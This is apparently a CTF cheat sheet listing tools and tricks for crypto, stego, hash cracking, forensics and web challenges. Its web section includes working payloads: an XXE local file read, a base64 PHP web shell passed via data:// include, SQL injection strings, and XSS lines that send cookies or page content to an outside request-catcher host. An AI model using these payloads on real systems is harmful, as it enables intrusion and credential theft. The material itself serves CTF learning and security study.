	A substitution cipher that replaces each character with five characters from a set of two (A and B is used most of the time). If we look at A as 0 and B as 1 it is a special encoding to binary numbers, where the character A has the value of binary `b00000`. Easy to recognize, because the ciphertext only contains two characters (e.g.: A and B) and the length of the ciphertext is divisible by 5. Example: `AAABB AAABA ABBAB AAABB AABAA AAAAB AAAAA AAABA ABBAB ABBAA`.

        [Online tool](http://rumkin.com/tools/cipher/baconian.php)

* [Python random module cracker/predictor](https://github.com/tna0y/Python-random-module-cracker)

	Python's `random` module can be predicted from previous values. This tool can be used to predict the next value from a list of previous results.

* Transposition Cipher


* [LC4](https://www.schneier.com/blog/archives/2018/05/lc4_another_pen.html) 
	This is an adaptation of RC4... just not. There is an implementation available in Python.
	[https://github.com/dstein64/LC4/blob/master/documentation.md](https://github.com/dstein64/LC4/blob/master/documentation.md)

* Elgamal

* Affine Cipher

* Substitution Cipher (use quip quip!)

	[https://quipqiup.com/](https://quipqiup.com/)

* Railfence Cipher

	[http://rumkin.com/tools/cipher/railfence.php](http://rumkin.com/tools/cipher/railfence.php)


* [Playfair Cipher](https://en.wikipedia.org/wiki/Playfair_cipher) 
	racker: [http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html](http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html)

* Polybius Square

	[https://www.braingle.com/brainteasers/codes/polybius.php](https://www.braingle.com/brainteasers/codes/polybius.php)

* The Engima

	[http://enigma.louisedade.co.uk/enigma.html](http://enigma.louisedade.co.uk/enigma.html),
	[https://www.dcode.fr/enigma-machine-cipher](https://www.dcode.fr/enigma-machine-cipher)


* Two-Time Pad

* [International Code of Signals Maritime](https://en.wikipedia.org/wiki/International_Code_of_Signals) 
	First drafted by the British Board of Trade in 1855 and adopted as a world-wide standard on 1 January 1901. It is used for communications with ships, but also occasionally used by geocaching mystery caches (puzzle caches), CTFs and various logic puzzles. You may want to give a look at the tool [maritime flags translator].


* Daggers Cipher

The daggers cipher is another silly text-to-image encoder. This is the key, and you can
find a decoder on [https://www.dcode.fr/daggers-alphabet](https://www.dcode.fr/daggers-alphabet).

![Cryptography/_img/dagger_cipher.png](Cryptography/_img/dagger_cipher.png)

* Hylian Language (Twilight Princess)

The Hylian language is another silly text-to-image encoder. This is the key, and you can
find a decoder on [https://www.dcode.fr/hylian-language-twilight-princess](https://www.dcode.fr/hylian-language-twilight-princess).

![Cryptography/_img/hylian.png](Cryptography/_img/hylian.png)

* Hylian Language (Breath of the Wild)

The Hylian language is another silly text-to-image encoder. This is the key, and you can
find a decoder on [https://www.dcode.fr/hylian-language-breath-of-the-wild](https://www.dcode.fr/hylian-language-breath-of-the-wild).

![Cryptography/_img/botw.jpg](Cryptography/_img/botw.jpg)

* Sheikah Language (Breathe of the Wild)

The Sheikah language is another silly text-to-image encoder. This is the key, and you can
find a decoder on [https://www.dcode.fr/sheikah-language](https://www.dcode.fr/sheikah-language).

![Cryptography/_img/sheikah.png](Cryptography/_img/sheikah.png)

* Hexahue Alphabet 

The hexhue is an another tex-to-image enocder. you can find a decoder
on [https://www.boxentriq.com/code-breaking/hexahue](https://www.boxentriq.com/code-breaking/hexahue)

![img](Cryptography/_img/hexahue-alphabet.png)


* References to DICE, or EFF

	If your challenges references "EFF" or includes dice in some way, or showcases numbers 1-6 of length 5, try [https://www.eff.org/dice](https://www.eff.org/dice). This could refer to a passphrase generated by dice rolls available here: [https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt](https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt)

* `Base64` <span style="color:red">❤️</span>, `Base32`, `Base85`, `Base91` ...

	| Name | Charset | Exemple |
	| --- | --- | --- |
	| Base64 | `A-Za-z0-9+/` | `SGVsbG8gV29ybGQh` |
	| Base32 | `A-Z2-7` | `JBSWY3DPEBLW64TMMQ======` |
	| Base85 | `A-Za-z0-9!#$%&()*+-;<=>?@^_` | `9jqo^F*bKt7!8'or``]8%F<+qT*` |
	| Base91 | `A-Za-z0-9!#$%&()*+,./:;<=>?@[]^_` | `fPNKd)T1E8K\*+9MH/@RPE.` |

	Usually decoded with python or the `base64 -d` command.


* [Base65535](https://github.com/qntm/base65536)


	Unicode characters encoding. Includes a lot of seemingly random spaces and chinese characters!


* [Base41](https://github.com/sveljko/base41/blob/master/python/base41.py)


* [Enigma](https://en.wikipedia.org/wiki/Enigma_machine)

	Machine used by the Germans during World War II to encrypt messages. Still takes a lot of time to crack today, but some tricks can be used to speed up the process.

	[404CTF WU](https://remyoudompheng.github.io/ctf/404ctf/enigma.html)


	



## RSA



[RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) is an **asymetric** cryptographic algorithm. A **public key** is used to encrypt data and a **private key** is used to decrypt data.

The variables of textbook RSA are:
- **N**: the product of two large primes
- **e**: the public exponent
- **d**: the private exponent

The public key is (N, e) and the private key is (N, d).

### Key generation
1. Choose two large primes **p** and **q**.
2. Compute **N = p * q**.
3. Compute **phi = (p - 1) * (q - 1)**.
4. Choose an integer **e** such that **1 < e < phi** and **gcd(e, phi) = 1** (usually **e = 65537**).
5. Compute **d** such that **d * e = 1 mod phi** i.e. **d = e^-1 mod phi**. (for exemple with the [Extended Euclidean algorithm](https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm))

### Encryption
To encrypt a message **m** with the public key **(N, e)**, compute $c = m^e \mod N$.

c is the ciphertext.

### Decryption
To decrypt a ciphertext **c** with the private key **(N, d)**, compute $m = c^d \mod N$.

m is the deciphered message.

Several attacks exist on RSA depending on the circumstances.

* [RSA CTF Tool](https://github.com/RsaCtfTool/RsaCtfTool) <span style="color:red">❤️</span>

    Performs several attacks on RSA keys. Very useful for CTFs.


* RSA: Classic RSA

	Variables typically given: `n`, `c`, `e`. _ALWAYS_ try and give to [http://factordb.com](http://factordb.com). If `p` and `q` are able to be determined, use some RSA decryptor; handmade code available here: [https://pastebin.com/ERAMhJ1v](https://pastebin.com/ERAMhJ1v)

__If FactorDB cannot find factors, try [alpertron](https://www.alpertron.com.ar/ECM.HTM)__


* RSA: `e` is 3 (or small)

	If `e` is 3, you can try the cubed-root attack. If you the cubed root of `c`, and if that is smaller than the cubed root of `n`, then your plaintext message `m` is just the cubed root of `c`! Here is [Python](https://www.python.org/) code to take the cubed root:

    ```python
    def root3rd(x):
        y, y1 = None, 2
        while y!=y1:
            y = y1
            y3 = y**3
            d = (2*y3+x)
            y1 = (y*(y3+2*x)+d//2)//d
        return y
    ```

* RSA: Wiener's Little D Attack

	The telltale sign for this kind of challenge is an enormously large `e` value. Typically `e` is either 65537 (0x10001) or `3` (like for a Chinese Remainder Theorem challenge). Some stolen code available here: [https://pastebin.com/VKjYsDqD](https://pastebin.com/VKjYsDqD)

* RSA:  Boneh-Durfee Attack
	The tellgate sign for this kind of challenge is also an enormously large `e` value (`e` and `n` have similar size).
Some code for this attack can be found [here](https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage)

* RSA: Chinese Remainder Attack

	These challenges can be spotted when given  mutiple `c` cipher texts and multiple `n` moduli. `e` must be the same number of given `c` and `n` pairs. Some handmade code here: [https://pastebin.com/qypwc6wH](https://pastebin.com/qypwc6wH)

* [RSA: Fixed Point](https://crypto.stackexchange.com/questions/81128/fixed-point-in-rsa-encryption)

    These challenges can be spotted when the input is not changed with encrypted/decrypted.

    There are 6 non-trivial fixed points in RSA encryption, caracterized by $m$ mod $p \in \{0, 1, -1\}$ **and** $m$ mod $q \in \{0, 1, -1\}$.

    It is possible to deduce one of the prime factors of $n$ from the fixed point, since $\text{gcd}(m−1,n),\ \text{gcd}(m,n),\ \text{gcd}(m+1,n)$ are $1, p, q$ in a different order depending on the values of $m$ mod $p$ and $m$ mod $q$.

    To find the other prime factor, you can simply use the Euclidean algorithm : 
    ```python
    q = n//p # in python
    ```


<br><br>

# Steganography



WHEN GIVEN A FILE TO WORK WITH, DO NOT FORGET TO RUN THIS STEGHIDE WITH AN EMPTY PASSWORD!

* [`steghide`](http://steghide.sourceforge.net/)

	Hide data in various kinds of image- and audio-files using a passphrase.

* [AperiSolve](https://www.aperisolve.com/) <span style="color:red">❤️</span>

	Online tool that run several steganography tools.

* [StegCracker](https://github.com/Paradoxis/StegCracker)

	Brute force passphrases for steghide encrypted files. Different data can have different passphrases.

* [Steganography Online](http://stylesuxx.github.io/steganography/)

	Online tool to hide data in images.

* [StegSeek](https://github.com/RickdeJager/stegseek)

	Faster than `stegcracker`.

* [`steg_brute.py`](https://github.com/Va5c0/Steghide-Brute-Force-Tool)

	This is similar to `stegcracker`.

* [`Stegsolve.jar`](http://www.caesum.com/handbook/stego.htm) <span style="color:red">❤️</span>

	View the image in different colorspaces and alpha channels.


* [`stepic`](http://domnit.org/stepic/doc/)

	Python library to hide data in images.

* [Digital Invisible Ink Stego Tool](http://diit.sourceforge.net/)

	A Java steganography tool that can hide any sort of file inside a digital image (regarding that the message will fit, and the image is 24 bit colour)


* [ImageHide](https://www.softpedia.com/get/Security/Encrypting/ImageHide.shtml)

	Hide any data in the LSB of an image. Can have a password.

* [stegoVeritas](https://github.com/bannsec/stegoVeritas/)

	CLI tool to extract data from images.

* Unicode Steganography / Zero-Width Space Characters

	Messages can be hidden in the unicode characters. For example usig the zero-width space character in it. Use a modern IDE like [Code](https://code.visualstudio.com/) to find these characters.

* Online LSB Tools

	Some online tools to hide data in the LSB of images.

	[https://manytools.org/hacker-tools/steganography-encode-text-into-image/](https://manytools.org/hacker-tools/steganography-encode-text-into-image/) Only supports PNG
	[https://stylesuxx.github.io/steganography/](https://stylesuxx.github.io/steganography/)

* Other stego tools:

	[https://github.com/DominicBreuker/stego-toolkit](https://github.com/DominicBreuker/stego-toolkit)

* [`zsteg`](https://github.com/zed-0xff/zsteg) <span style="color:red">❤️</span>

	Command-line tool for **PNG** and **BMP** steganography.

* [`jsteg`](https://github.com/lukechampine/jsteg)

    Command-line tool for **JPEG** steganography.

* [Jstego][https://sourceforge.net/projects/jstego/]

    GUI tool for **JPG** steganography.

* [`openstego`](https://www.openstego.com/)

	Steganography tool.

* Morse Code

	Morse code can be everywhere.

* Whitespace

	Tabs and spaces (for exemple in the indentation) can hide data. Some tools can find it: [`snow`](http://www.darkside.com.au/snow/) or an esoteric programming language interpreter: [https://tio.run/#whitespace](https://tio.run/#whitespace)

* [`snow`](http://www.darkside.com.au/snow/)

	A command-line tool for whitespace steganography.

* [`exiftool`](https://exiftool.org/) <span style="color:red">❤️</span>

	Tool to view and edit metadata in files.

* Extract Thumbnail (data is covered in original image)

	If you have an image where the data you need is covered, try viewing the thumbnail:

	```
	exiftool -b -ThumbnailImage my_image.jpg > my_thumbnail.jpg
	```

* [spectrogram](https://en.wikipedia.org/wiki/Spectrogram)

	An image can be hidden in the spectrogram of an audio file. [`audacity`](https://www.audacityteam.org/) can show the spectrogram of an audio file. (To select Spectrogram view, click on the track name (or the black triangle) in the Track Control Panel which opens the Track Dropdown Menu, where the spectrogram view can be selected.. )

* [XIAO Steganography](https://xiao-steganography.en.softonic.com/)

	Windows software to hide data in audio.

* [DTMF](https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling).

	Dual tone multi-frequency is a signaling system using the voice-frequency band over telephone lines. It can be used to send text messages over the phone. Some tool: [Detect DTMF Tones](http://dialabc.com/sound/detect/index.html) 
	

* Phone-Keypad

	Letters can be encoded with numbers using a phone keypad.

![https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSySxHjMFv80XWp74LZpfrnAro6a1MLqeF1F3zpguA5PGSW9ov](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSySxHjMFv80XWp74LZpfrnAro6a1MLqeF1F3zpguA5PGSW9ov)

* [`hipshot`](https://bitbucket.org/eliteraspberries/hipshot)

	A python tool to hide a video in an image.

* [QR code](https://en.wikipedia.org/wiki/QR_code) 
	
	Square barcode that can store data.

* [`zbarimg`](https://linux.die.net/man/1/zbarimg)

	CLI tool to scan QR codes of different types.


* Corrupted image files

	See [Images forensics](#images)

<br><br>

# PDF Files




* [`pdfinfo`](https://poppler.freedesktop.org/)

	A command-line tool to get a basic synopsis of what the [PDF](https://en.wikipedia.org/wiki/Portable_Document_Format) file is.

* [`pdfcrack`](https://pdfcrack.sourceforge.net/)

	A comand-line tool to __recover a password from a PDF file.__ Supports dictionary wordlists and bruteforce.

* [`pdfimages`](https://poppler.freedesktop.org/)

	A command-line tool, the first thing to reach for when given a PDF file. It extracts the images stored in a PDF file, but it needs the name of an output directory (that it will create for) to place the found images.

* [`pdfdetach`](https://www.systutorials.com/docs/linux/man/1-pdfdetach/)

	A command-line tool to extract files out of a [PDF].
<br><br>

# ZIP Files



* `zip2john` <span style="color:red">❤️</span>

    Brute force password protected zip files.

    ``` bash
    zip2john protected.zip > protected.john
    john --wordlist=/usr/share/wordlists/rockyou.txt protected.john
    ```

* [`bkcrack`](https://github.com/kimci86/bkcrack)

    Crack ZipCrypto Store files. Need some plaintext to work.


<br><br>

# Hashes



* [Hash types](https://hashcat.net/wiki/doku.php?id=example_hashes)

    Different hash types exists, and they are used in different contexts. This page lists the most common hash types and their respective hashcat modes.

| Hash type | Byte Length | Hashcat mode | Example hash  |
|-----------|--------------|--------------|--------------|
| MD5      | 32  | 0    | `8743b52063cd84097a65d1633f5c74f5` |
| SHA1     | 40  | 100  | `b89eaac7e61417341b710b727768294d0e6a277b` |
| SHA256   | 64  | 1400 | `127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935` |
| SHA2-512 | 128 | 1700 | too long |



* [Haiti](https://github.com/noraj/haiti/)

    CLI Hash type identifier

* [Hashcat](https://hashcat.net/hashcat/)

    Crack hashes. Can use GPU.


* [John the Ripper](https://www.openwall.com/john/)

    Better compatibility and easier to use than hashcat, but lower number of hash types supported.

* [dcipher](https://github.com/k4m4/dcipher-cli)

    CLI tool to lookup hashes in online databases.
<br><br>

# OSINT



* [`Sherlock`](https://github.com/sherlock-project/sherlock)

    Python script to search for usernames across social networks.

* [Google reverse image search](https://www.google.fr/imghp)

    Search by image.
<br><br>

# Network

⇨ [DNS Exfiltration](#dns-exfiltration)<br>


* [Wireshark](https://www.wireshark.org/) <span style="color:red">❤️</span>
	The go-to tool for examining [`.pcap`](https://en.wikipedia.org/wiki/Pcap) files.

* [Network Miner](http://www.netresec.com/?page=NetworkMiner) 
	Seriously cool tool that will try and scrape out images, files, credentials and other goods from [PCAP](https://en.wikipedia.org/wiki/Pcap) and [PCAPNG](https://github.com/pcapng/pcapng) files.

* [PCAPNG](https://github.com/pcapng/pcapng) 
	Not all tools like the [PCAPNG](https://github.com/pcapng/pcapng) file format... so you can convert them with an online tool [http://pcapng.com/](http://pcapng.com/) or from the command-line with the `editcap` command that comes with installing [Wireshark]:

	```
	editcap old_file.pcapng new_file.pcap
	```

* [`tcpflow`](https://github.com/simsong/tcpflow)

	A command-line tool for reorganizing packets in a PCAP file and getting files out of them. __Typically it gives no output, but it creates the files in your current directory!__

	```
	tcpflow -r my_file.pcap
	ls -1t | head -5 # see the last 5 recently modified files
	```



* [PcapXray](https://github.com/Srinivas11789/PcapXray) 
	A GUI tool to visualize network traffic.
	



## DNS Exfiltration



DNS can be used to exfiltrate data, for example to bypass firewalls.

* [iodine](https://github.com/yarrick/iodine)

    Can be identifed by the presence of the "Aaahhh-Drink-mal-ein-Jägermeister" or "La flûte naïve française est retirée à Crête".<br>
    Can be decipherd with [this script](Network/Tools/iodine/exploit.py)<br>
    [Hack.lu CTF WU](http://blog.stalkr.net/2010/10/hacklu-ctf-challenge-9-bottle-writeup.html)

* [DNScat2](https://github.com/iagox86/dnscat2)

    Can be identified when [file signatures](#file%20scanning) are present in the DNS queries.
    Data can be extracted with [this script](Network/Tools/dnscat2/exploit.py) and fies can be extracted with [binwalk](#file%20scanning).





<br><br>

# Jail Break



* Missing `ls` or `dir` commands

	If you cannot run `ls` or `dir`, or `find` or `grep`, to list files you can use

	```
	echo *
	echo /any/path/*
	```


* restricted bash (`rbash`) read files

	If you are a restricted shell like `rbash` you can still read any file with some builtin commands like `mapfile`:

	```
	mapfile -t  < /etc/passwd
	printf "$s\n" "${anything[@]}"
	```


* Python 3

    `().__class__.__base__.__subclasses__()` - Gives access to `object` subclasses
<br><br>

# Android

⇨ [System Forensics](#system-forensics)<br>⇨ [APK Forensics](#apk-forensics)<br>

* [Android Studio](https://developer.android.com/studio)

    Main IDE for Android development. Java and Kotlin can be used.

## System Forensics



* [Gesture cracking]

    The gesture needed to unlock the phone is stored in `/data/system/gesture.key` as a SHA1 hash of the gesture. [This python script](Android/Tools/gesture_cracker.py) or [this C program](Android/Tools/gesture_cracker.c) can be used to crack the gesture, .



## APK Forensics



* [`jadx`](https://github.com/skylot/jadx) <span style="color:red">❤️</span>

    Decompiles Android APKs to Java source code. Comes with a GUI.

	```bash
	jadx -d "$(pwd)/out" "$(pwd)/<app>" # Decompile the APK to a folder
	```

* [`apktool`](https://ibotpeaches.github.io/Apktool/)

	A command-line tool to extract all the resources from an APK file.

	```bash
	apktool d <file.apk> # Extracts the APK to a folder
	```


* [`dex2jar`](https://github.com/pxb1988/dex2jar)

	A command-line tool to convert a J.dex file to .class file and zip them as JAR files.


* [`jd-gui`](https://github.com/java-decompiler/jd-gui)

	A GUI tool to decompile Java code, and JAR files.



<br><br>

# Web

⇨ [PHP](#php)<br>⇨ [SQL Injection](#sql-injection)<br>⇨ [Enumeration](#enumeration)<br>⇨ [XSS](#xss)<br>

* [`wpscan`](https://wpscan.org/)

  Scan [Wordpress](https://en.wikipedia.org/wiki/WordPress) sites for vulnerabilities.


* XXE : XML External Entity

    Include local files in XML. Can be used to make an **LFI** from a XML parser.
    XML script to display the content of the file /flag :

    Dont forget to use <?xml version="1.0" encoding="UTF-16"?> on Windows (for utf16).

	``` xml
	<?xml version="1.0"?>
	<!DOCTYPE data [
	<!ELEMENT data (#ANY)>
	<!ENTITY file SYSTEM "file:///flag">
	]>
	<data>&file;</data>
	```


* [`nikto`](https://github.com/sullo/nikto)

	Website scanner implemented in [Perl](https://en.wikipedia.org/wiki/Perl).


* [Burpsuite](https://portswigger.net/burp) <span style="color:red">❤️</span>

	Most used tool to do web pentesting. It is a proxy that allows you to intercept and modify HTTP requests and responses.


* AWS / S3 Buckets dump

	Dump all files from a S3 bucket that does not require authentication.

	``` bash
	aws s3 cp --recursive --no-sign-request s3://<bucket_name> .
	```

## PHP




* Magic Hashes

	A common vulnerability in [PHP](https://en.wikipedia.org/wiki/PHP) that fakes hash "collisions..." where the `==` operator falls short in [PHP](https://en.wikipedia.org/wiki/PHP) type comparison, thinking everything that follows `0e` is considered scientific notation (and therefore 0). More valuable info can be found here: [https://github.com/spaze/hashes](https://github.com/spaze/hashes).


* `preg_replace`

	A bug in older versions of [PHP](https://en.wikipedia.org/wiki/PHP) where the user could get remote code execution

	[http://php.net/manual/en/function.preg-replace.php](http://php.net/manual/en/function.preg-replace.php)


* [`phpdc.phpr`](https://github.com/lighttpd/xcache/blob/master/bin/phpdc.phpr)

	A command-line tool to decode [`bcompiler`](http://php.net/manual/en/book.bcompiler.php) compiled [PHP](https://en.wikipedia.org/wiki/PHP) code.


* [`php://filter` for Local File Inclusion](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/) 

	A bug in [PHP](https://en.wikipedia.org/wiki/PHP) where if GET HTTP variables in the URL are controlling the navigation of the web page, perhaps the source code is `include`-ing other files to be served to the user. This can be manipulated by using [PHP filters](http://php.net/manual/en/filters.php) to potentially retrieve source code. Example like so:

	```
	http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
	```


* `data://text/plain;base64` <span style="color:red">❤️</span>

	A [PHP](https://en.wikipedia.org/wiki/PHP) stream that can be taken advantage of if used and evaluated as an `include` resource or evaluated. Can be used for RCE: check out this writeup: [https://ctftime.org/writeup/8868](https://ctftime.org/writeup/8868)

	```
	http://dommain.net?cmd=whoami&page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=
	```


* [`PHP Generic Gadget Chains`](https://github.com/ambionics/phpggc)

	Payloads for Object injection in `unserialize` on different frameworks.



## SQL Injection



Occurs when user input is not properly sanitized and is used directly in a SQL query. This can be used to bypass authentication, read sensitive data, or even execute arbitrary code on the database server.

The most commom one to use is the `"OR 1=1--` injection. This will always return true on a `WHERE` clause.

The application will then see the query as:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = "" OR 1=1--"
```

* SQL `IF` and `SLEEP` statements for Blind SQL Injection

	Used to exfiltrate data when the target does not provide the result of the vulnerable query. If the provided condition is true, the query will take a certain amount of time to execute. If the condition is false, the query will execute faster.

	```sql
	/* Check if the first character of the password is 'a' */
	SELECT IF(substr(password, 1, 1) = 'a', SLEEP(5), 1); 

	/* Check if the second character of the password is 'b' */
	SELECT IF(substr(password, 2, 1) = 'b', SLEEP(5), 1); 
	
	/* etc for all position and letters */
	```



* [`sqlmap`](https://github.com/sqlmapproject/sqlmap)

	A command-line tool written in [Python](https://www.python.org/) to automatically detect and exploit vulnerable SQL injection points.



## Enumeration





* `robots.txt` <span style="color:red">❤️</span>

	File to tell search engines not to index certain files or directories.


* Mac / Macintosh / Apple Hidden Files `.DS_Store` [DS_Store_crawler](https://github.com/anantshri/DS_Store_crawler_parser)

	On Mac, there is a hidden index file `.DS_Store` listing the content of the directory. Useful if you have a **LFI** vulnerability.

    ```bash
    python3 dsstore_crawler.py -i <url>
    ```

* Bazaar `.bzr` directory

	Contains the history of the project. Can be used to find old versions of the project. Can be fetched with [https://github.com/kost/dvcs-ripper](https://github.com/kost/dvcs-ripper)

    Download the bzr repository:
    ```bash
    bzr branch <url> <out-dir>
    ```


* [`GitDumper`](https://github.com/arthaud/git-dumper) <span style="color:red">❤️</span>

	A command-line tool that will automatically scrape and download a [git](https://git-scm.com/) repository hosted online with a given URL.

    When `/.git` is reachable, there is a [git](https://git-scm.com/) repo that contains the history of the project. Can be used to find old versions of the project and to maybe find **credentials** in sources. Use git commands (from your favorite git cheatsheet) to navigate the history.

    ```bash
    gitdumper <url>/.git/ <out-dir>
    ```

* Mac AutoLogin Password Cracking with `/etc/kcpassword`

	`/etc/kcpassword` is a file that contains the password for the Mac OS X auto-login user. It is encrypted with a key that is stored in the kernel, but sometimes it can be decrypted with the following python script:

    ``` python
    def kcpasswd(ciphertext):
        key = '7d895223d2bcddeaa3b91f'
        while len(key) < (len(ciphertext)*2):
            key = key + key
        key = binasciiunhexlify(key)
        result = ''
        for i in range(len(ciphertext)):
            result += chr(ord(ciphertext[i]) ^ (key[i]))
        return result
    ```




## XSS



The **XSS** vulnerability occurs when a user can control the content of a web page. A malicious code can be used to steal cookies of authentified users, redirect the user to a malicious site, or even execute arbitrary code on the user's machine.

Exemple of XSS :

```html
<img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
```

These sites can be used to create hooks to catch HTTP requests:

| Site |
| --- |
| [`requestb.in`](https://requestb.in/) |
| [`hookbin.com`](https://hookbin.com/) |


* [XSS Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

* Filter Evasion

	[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) can be used to bypass XSS filters.

* `HTTPOnly` cookie flag

	When the `HTTPOnly` flag is set, the cookie is not accessible by JavaScript. This can be bypassed by using the target's browser as a proxy to recieve the cookie when it is sent to the victim's browser:

	```html
	<!-- With the script tag -->
	<script>
	fetch("https://target-site.url/")
	.then((data) => fetch("https://<myHook>/?/=".concat(JSON.stringify(data)), { credentials: 'include' }));
	</script>

	<!-- With an image -->
	<img src="https://target-site.url/" onerror="fetch('https://<myHook>/?/='+JSON.stringify(this), { credentials: 'include' })">
	```



* [XSStrike](https://github.com/UltimateHackers/XSStrike)

	A python CLI tool for XSS detection and exploitation.



<br><br>

# Esoteric Languages



Tools
-----

* [DCode](https://www.dcode.fr)

	Support many crypto algorithms, but also some interesting tools.


* [Try It Online](https://tio.run/)

	Online tool for running code in many languages.


Languages
---------

* [Brainfuck](https://esolangs.org/wiki/brainfuck)

	Famous esoteric language, with a very **simple syntax**. Functions like a Turing machine.

	Exemple Hello World:
	```brainfuck
	++++++++[>++++[>++>+++>+++>+<<<<-]>+>+>->>+[<]<-]>>.>---.+++++++..+++.>>.<-.<.+++.------.--------.>>+.>++.
	```

* [COW](https://esolangs.org/wiki/COW)

	Uses MOO statements in different **capitalizations** to represent different instructions.

	```
	MoO moO MoO mOo MOO OOM MMM moO moO
	MMM mOo mOo moO MMM mOo MMM moO moO
	MOO MOo mOo MoO moO moo mOo mOo moo
	```

* [Malboge](https://esolangs.org/wiki/malbolge)

	Very hard language, that looks like `Base85`.

	```
	(=<`#9]~6ZY32Vx/4Rs+0No-&Jk)"Fh}|Bcy?`=*z]Kw%oG4UUS0/@-ejc(:'8dc
	```

* [Piet](https://esolangs.org/wiki/piet)

	Programs are represented as images. Can be interpreted with [`npiet`](https://www.bertnase.de/npiet/)

![https://www.bertnase.de/npiet/hi.png](https://www.bertnase.de/npiet/hi.png)

* [Ook!](http://esolangs.org/wiki/ook!)

	Recognizable by `.` and `?`, and `!`. Online interpreter for this language: [https://www.dcode.fr/ook-language](https://www.dcode.fr/ook-language) 
	

	Exemple code:
	```Ook!
	Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
	Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
	Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook.
	Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
	Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook?
	Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook.
	```

* [Rockstar](https://esolangs.org/wiki/Rockstar)

	Look like song lyrics.
	Rockstar has an official online interpreter: [https://codewithrockstar.com/online](https://codewithrockstar.com/online)

	Fizzbuzz in Rockstar:
	```rockstar
	Midnight takes your heart and your soul
	While your heart is as high as your soul
	Put your heart without your soul into your heart

	Give back your heart


	Desire is a lovestruck ladykiller
	My world is nothing
	Fire is ice
	Hate is water
	Until my world is Desire,
	Build my world up
	If Midnight taking my world, Fire is nothing and Midnight taking my world, Hate is nothing
	Shout "FizzBuzz!"
	Take it to the top

	If Midnight taking my world, Fire is nothing
	Shout "Fizz!"
	Take it to the top

	If Midnight taking my world, Hate is nothing
	Say "Buzz!"
	Take it to the top

	Whisper my world
	```
<br><br>

# Data Science

⇨ [Supervised Classification](#supervised-classification)<br>⇨ [Unsupervised Clasification](#unsupervised-clasification)<br>



* [SciKit Lean](https://scikit-learn.org/)

    Machine learning in Python.

* [SciKit Mine](https://scikit-mine.github.io/scikit-mine/)

    Data mining in Python.

* [(Book) Hands-On Machine Learning with Scikit-Learn, Keras, and TensorFlow, Aurélien Géron]()

    Very useful book that was used to create this section.

## Supervised Classification



#### Models

* [Logistic Regression]()

    High explainablility, reasonable computation cost.

* [Decision Tree]()

    Performs classification, regression, and multi-output tasks. Good at finding **orthogonal** decision boundaries.

    But very sensitive to small changes in the data, which make them hard to train.


* [Random Forest]()

    Very powerful model. Uses an ensemble method to combine multiple decision trees. 


* [Support Vector Machine (SVM)]()

    Popular model that performs linear and non-linear classification, regression, and outlier detection.

    Works well with **small to medium** sized datasets.


* [K-Nearest Neighbors (KNN)]()


* [Naive Bayes]()

* [Multi Layer Perceptron (MLP)]()

    A neural network model that can learn non-linear decision boundaries.

    Good for **large** datasets.



## Unsupervised Clasification



### Models

* [K-Means Clustering]()

    Simple clustering algorithm that groups data points into a specified number of clusters.

* [Gaussian Mixture Model (GMM)]()

    A probabilistic model that assumes that the data was generated from a finite sum of Gaussian distributions.





<br><br>

# Signal processing



* [Scipy](https://scipy.org/install/)

    Can be used for signal processing.

    Exemple is provided in [process_signal.ipynb](Signal%20processing/Tools/process_signal.ipynb)
<br><br>

# Wireless



* [`gnuradio`](https://wiki.gnuradio.org/index.php/InstallingGR)

    `gnuradio` and it's GUI `gnuradio-companion` are used to create or analyse RF (Radio Frequency) signals.
<br><br>

# Other CheatSheets




* [CTF-Katana](https://github.com/JohnHammond/ctf-katana)

    Most of the tools and idaes provided come from there.

* [Hack Tricks](https://book.hacktricks.xyz/)

    A collection of useful commands and tricks for penetration testing.

* [thehacker.recipes](https://www.thehacker.recipes/)

    Very complete on Active Directory.

* [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

	Super useful repo that has a payload for basically every sceario

* [SecLists](https://github.com/danielmiessler/SecLists)

    A LOT of wordlists for different purposes.